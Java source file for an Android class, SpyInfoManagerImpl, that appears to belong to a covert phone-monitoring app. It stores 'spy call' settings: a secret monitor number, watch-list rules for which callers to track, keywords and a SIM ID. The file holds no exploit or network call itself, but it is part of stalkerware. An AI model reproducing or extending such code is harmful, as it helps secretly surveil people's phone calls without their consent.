package com.fx.preference;

import java.util.List;

import android.content.ContentValues;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;

import com.fx.maind.ServiceManager;
import com.fx.maind.ref.Customization;
import com.fx.util.FxUtil;
import com.vvt.logger.FxLog;
import com.vvt.util.GeneralUtil;

class SpyInfoManagerImpl extends SpyInfoManager {
	
	private static final String TAG = "SpyInfoManager";
	private static final boolean LOGV = Customization.VERBOSE;
	
	private static SpyInfoManagerImpl sInstance;
	private static PreferenceDatabaseHelper sPreferencedbHelper;
	
	private Context mContext;
	
	public static SpyInfoManagerImpl getInstance(Context context) {
		// need to be instantiate before calling super(context)
		if (sPreferencedbHelper == null) {
			sPreferencedbHelper = PreferenceDatabaseHelper.getInstance();
		}
		
		if (sInstance == null) {
			sInstance = new SpyInfoManagerImpl(context);
		}
		
		return sInstance;
	}
	
	private SpyInfoManagerImpl(Context context) {
		super(context);
		
		mContext = context;
		
		if (isInitializeNeeded()) {
			initializeSpyInfoTable();
			
			if (LOGV) {
				FxLog.v(TAG, String.format("SpyInfo is initialized"));
			}
		}
	}

	public boolean isEnabled() {
		return (Boolean) getSpyInfoValue(
				PreferenceDatabaseMetadata.SpyInfo.IS_SPY_CALL_ENABLED, 
				Boolean.class);
	}
	
	public void setEnabled(boolean enabled) {
		setSpyInfoValue(
				PreferenceDatabaseMetadata.SpyInfo.IS_SPY_CALL_ENABLED, 
				enabled);
		
		// Now, sendRequest() is relocated

		if (LOGV) FxLog.v(TAG, String.format("Set spy enabled: %s", enabled));
	}
	
	public String getMonitorNumber() {
		String monitorNumber = "";
		
		String value = (String) getSpyInfoValue(
				PreferenceDatabaseMetadata.SpyInfo.MONITOR_NUMBER, 
				String.class);
		
		if (value != null && value.trim().length() > 0) {
			monitorNumber = FxUtil.getDecryptedQueryData((String) value, false);
		}
		
		if (LOGV) {
			FxLog.v(TAG, String.format(
					"Get Monitor Number: %s, Decrypted Value: %s", 
					value, monitorNumber));
		}
		
		return monitorNumber;
	}
	
	public void setMonitorNumber(String monitorNumber) {
		String insertData = monitorNumber;
		
		if (monitorNumber != null && monitorNumber.trim().length() > 0) {
			insertData = FxUtil.getEncryptedInsertData(monitorNumber, false);
		}
		
		setSpyInfoValue(PreferenceDatabaseMetadata.SpyInfo.MONITOR_NUMBER, insertData);
		
		if (LOGV) {
			FxLog.v(TAG, String.format(
					"Set Monitor Number: %s, Encrypted Value: %s", 
					monitorNumber, insertData));
		}
	}

	public String getWatchListStatus() {
		
		StringBuilder s = new StringBuilder();
		
		if (isWatchAllEnabled()) {
			s.append("Watch all number");
			return s.toString();
		}
		
		if (isWatchListEnabled()) {
			if (s.length() > 0) {
				s.append(", ");
			}
			s.append("Number in watch list");
		}
		
		if (isWatchPrivateEnabled()) {
			if (s.length() > 0) {
				s.append(", ");
			}
			s.append("Private number");
		}
		
		if (s.length() == 0) {
			s.append("Disabled");
		}
		
		return s.toString();
	}

	public boolean isWatchAllEnabled() {
		return (Boolean) getSpyInfoValue(
				PreferenceDatabaseMetadata.SpyInfo.WATCH_ALL_NUMBER, 
				Boolean.class);
	}

	public void setWatchAllEnabled(Boolean enabled) {
		setSpyInfoValue(PreferenceDatabaseMetadata.SpyInfo.WATCH_ALL_NUMBER, enabled);
		
		if (LOGV) FxLog.v(TAG, String.format("Set watch all number: %s", enabled));
		
		// All other options should be enabled
		setSpyInfoValue(PreferenceDatabaseMetadata.SpyInfo.WATCH_IN_CONTACTS, enabled);
		setSpyInfoValue(PreferenceDatabaseMetadata.SpyInfo.WATCH_NOT_IN_CONTACTS, enabled);
		setSpyInfoValue(PreferenceDatabaseMetadata.SpyInfo.WATCH_IN_WATCH_LIST, enabled);
		setSpyInfoValue(PreferenceDatabaseMetadata.SpyInfo.WATCH_PRIVATE_NUMBER, enabled);
		setSpyInfoValue(PreferenceDatabaseMetadata.SpyInfo.WATCH_UNKNOWN_NUMBER, enabled);
	}
	
	public boolean isWatchListEnabled() {
		return (Boolean) getSpyInfoValue(
				PreferenceDatabaseMetadata.SpyInfo.WATCH_IN_WATCH_LIST, 
				Boolean.class);
	}

	public void setWatchListEnabled(Boolean enabled) {
		setSpyInfoValue(PreferenceDatabaseMetadata.SpyInfo.WATCH_IN_WATCH_LIST, enabled);
		if (LOGV) FxLog.v(TAG, String.format("Set watch number in watch list: %s", enabled));
	}

	public boolean isWatchPrivateEnabled() {
		return (Boolean) getSpyInfoValue(
				PreferenceDatabaseMetadata.SpyInfo.WATCH_PRIVATE_NUMBER, 
				Boolean.class);
	}

	public void setWatchPrivateEnabled(Boolean enabled) {
		setSpyInfoValue(PreferenceDatabaseMetadata.SpyInfo.WATCH_PRIVATE_NUMBER, enabled);
		if (LOGV) FxLog.v(TAG, String.format("Set watch private number: %s", enabled));
	}
	
	@Override
	public void dumpWatchListToStorage() {
		// Delete all numbers from watch list database
		sPreferencedbHelper.delete(
				Uri.parse(PreferenceDatabaseMetadata.WatchList.URI), null, null);
		
		// Add set of numbers to database
		List<String> watchList = getEditableWatchList();
		
		if (LOGV) FxLog.v(TAG, "dumpWatchListToStorage # watchList:");
		
		for (String number : watchList) {
			sPreferencedbHelper.insert(
					Uri.parse(PreferenceDatabaseMetadata.WatchList.URI), 
					GeneralUtil.getUpdatingContentValues(
							PreferenceDatabaseMetadata.WatchList.WATCH_NUMBER, number));
			if (LOGV) FxLog.v(TAG, "dumpWatchListToStorage # " + number);
		}
	}

	@Override
	public void loadWatchListFromStorage() {
		Cursor cursor = sPreferencedbHelper.query(
				Uri.parse(PreferenceDatabaseMetadata.WatchList.URI), 
				null, null, null, null);
		
		// Get reference to watchList object and eliminate all members
		List<String> watchList = getEditableWatchList();
		watchList.clear();
		
		String watchNumber = null;
		
		while (cursor.moveToNext()) {
			watchNumber = cursor.getString(cursor.getColumnIndex(
					PreferenceDatabaseMetadata.WatchList.WATCH_NUMBER));
			
			watchList.add(watchNumber);
		}
		
		cursor.close();
		
		if (LOGV) {
			FxLog.v(TAG, "loadWatchListFromStorage # watchList:");
			
			for (String number : watchList) {
				FxLog.v(TAG, String.format("loadWatchListFromStorage # %s", number));
			}
		}
	}

	@Override
	public String getSimId() {
		return (String) getSpyInfoValue(
				PreferenceDatabaseMetadata.SpyInfo.SIM_ID, String.class);
	}

	@Override
	public void setSimId(String simId) {
		setSpyInfoValue(PreferenceDatabaseMetadata.SpyInfo.SIM_ID, simId);
		if (LOGV) FxLog.v(TAG, String.format("Set SIM ID: %s", simId));
	}
	
	@Override
	public String getKeyword1() {
		return (String) getSpyInfoValue(PreferenceDatabaseMetadata.SpyInfo.KW_1, String.class);
	}

	@Override
	public void setKeyword1(String kw1) {
		setSpyInfoValue(PreferenceDatabaseMetadata.SpyInfo.KW_1, kw1);
		if (LOGV) FxLog.v(TAG, String.format("Set keyword#1: %s", kw1));
	}

	@Override
	public String getKeyword2() {
		return (String) getSpyInfoValue(PreferenceDatabaseMetadata.SpyInfo.KW_2, String.class);
	}

	@Override
	public void setKeyword2(String kw2) {
		setSpyInfoValue(PreferenceDatabaseMetadata.SpyInfo.KW_2, kw2);
		if (LOGV) FxLog.v(TAG, String.format("Set keyword#2: %s", kw2));
	}

	private boolean isInitializeNeeded() {
		Cursor cursor = sPreferencedbHelper.query(
				Uri.parse(PreferenceDatabaseMetadata.SpyInfo.URI), 
				null, null, null, null);
		
		boolean isInitializeNeeded = true;
		
		if (cursor != null && cursor.getCount() > 0) {
			isInitializeNeeded = false;
		}
		
		if (cursor != null) {
			cursor.close();
		}
		
		return isInitializeNeeded;
	}
	
	private void initializeSpyInfoTable() {
		Uri insert = Uri.parse(PreferenceDatabaseMetadata.SpyInfo.URI);
		
		ContentValues values = new ContentValues();
		values.put(PreferenceDatabaseMetadata.SpyInfo.IS_SPY_CALL_ENABLED, false);
		values.put(PreferenceDatabaseMetadata.SpyInfo.MONITOR_NUMBER, "");
		values.put(PreferenceDatabaseMetadata.SpyInfo.WATCH_ALL_NUMBER, false);
		values.put(PreferenceDatabaseMetadata.SpyInfo.WATCH_IN_CONTACTS, false);
		values.put(PreferenceDatabaseMetadata.SpyInfo.WATCH_NOT_IN_CONTACTS, false);
		values.put(PreferenceDatabaseMetadata.SpyInfo.WATCH_IN_WATCH_LIST, false);
		values.put(PreferenceDatabaseMetadata.SpyInfo.WATCH_PRIVATE_NUMBER, false);
		values.put(PreferenceDatabaseMetadata.SpyInfo.WATCH_UNKNOWN_NUMBER, false);
		values.put(PreferenceDatabaseMetadata.SpyInfo.KW_1, "");
		values.put(PreferenceDatabaseMetadata.SpyInfo.KW_2, "");
		values.put(PreferenceDatabaseMetadata.SpyInfo.SIM_ID, "");
		
		sPreferencedbHelper.insert(insert, values);
	}
	
	private Object getSpyInfoValue(String column, Class<?> valueClass) {
    	
    	Cursor cursor = sPreferencedbHelper.query(
    			Uri.parse(PreferenceDatabaseMetadata.SpyInfo.URI), null, null, null, null);
    	
    	Object value = GeneralUtil.getCursorValue(cursor, valueClass, column);
    	
    	if (cursor != null) {
    		cursor.close();
    	}
    	
    	return value;
    }
	
	private int setSpyInfoValue(String key, Object value) {
		return sPreferencedbHelper.update(
				Uri.parse(PreferenceDatabaseMetadata.SpyInfo.URI), 
				GeneralUtil.getUpdatingContentValues(key, value), 
				null, null);
	}

	@Override
	public void sendRequestUpdateSpyInfo() {
		ServiceManager.getInstance(mContext).applySpySettings();
	}

}
